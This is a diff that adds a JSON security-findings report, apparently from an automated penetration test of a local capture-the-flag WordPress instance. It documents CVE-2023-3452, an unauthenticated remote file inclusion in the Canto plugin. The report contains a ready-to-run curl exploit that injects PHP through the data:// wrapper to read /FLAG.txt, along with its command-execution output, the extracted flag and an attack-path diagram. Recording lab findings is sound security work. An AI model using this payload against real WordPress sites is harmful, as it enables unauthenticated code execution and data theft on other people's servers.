@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-13T20:47:30.572121+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "3ad6a8c4-7532-45f4-bea3-d50643ac1674",
+      "timestamp": "2026-04-13T20:47:30.571999+00:00",
+      "title": "CVE-2023-3452: Canto Plugin \u2264 3.0.4 - Unauthenticated Remote File Inclusion (RFI) \u2192 RCE \u2192 Flag",
+      "severity": "critical",
+      "target": "http://172.17.0.1:55683/wp-content/plugins/canto/includes/lib/download.php",
+      "description": "The Canto WordPress plugin version 3.0.4 (and below) contains multiple PHP files in wp-content/plugins/canto/includes/lib/ that are directly accessible without authentication and use user-supplied input in require_once() calls. The parameter wp_abspath (or abspath) is passed directly to require_once() without sanitization, enabling Remote File Inclusion via the data:// PHP stream wrapper. This allows unauthenticated attackers to execute arbitrary PHP code on the server.",
+      "evidence": "Exploit: POST /wp-content/plugins/canto/includes/lib/download.php with body: wp_abspath=data://text/plain,<?php echo file_get_contents('/FLAG.txt'); ?>\n\nRCE confirmation (id):\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nFlag extracted from /FLAG.txt:\nflag{24796716-6e4f-4db6-adcb-2bc42d4c0fb3}",
+      "tool_used": "curl",
+      "cve": "CVE-2023-3452",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s 'http://172.17.0.1:55683/wp-content/plugins/canto/includes/lib/download.php' --data-urlencode \"wp_abspath=data://text/plain,<?php echo file_get_contents('/FLAG.txt'); ?>\"",
+        "expected": "flag{24796716-6e4f-4db6-adcb-2bc42d4c0fb3}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "77117108-b206-45f6-9cc0-a7b40e187c0f",
+      "timestamp": "2026-04-13T20:47:39.514244+00:00",
+      "title": "Attack Path - CVE-2023-3452 Canto Plugin RFI",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker (Unauthenticated)\"] --> CantoRFI[\"POST /wp-content/plugins/canto/includes/lib/download.php\\n?wp_abspath=data://text/plain,PHP_CODE\"]\n  CantoRFI --> PHPExec[\"PHP require_once executes\\ndata:// stream with injected code\"]\n  PHPExec --> FileRead[\"file_get_contents('/FLAG.txt')\"]\n  FileRead --> Flag[\"flag{24796716-6e4f-4db6-adcb-2bc42d4c0fb3}\"]\n  WPSite[\"WordPress 6.9.4\\n(MELODIC MAYHEM)\"] --> CantoPlugin[\"Canto Plugin 3.0.4\\n(CVE-2023-3452)\"]\n  CantoPlugin --> CantoRFI\n  Server[\"Apache/2.4.41 Ubuntu\\n172.17.0.1:55683\"] --> WPSite"
+    }
+  ]
+}
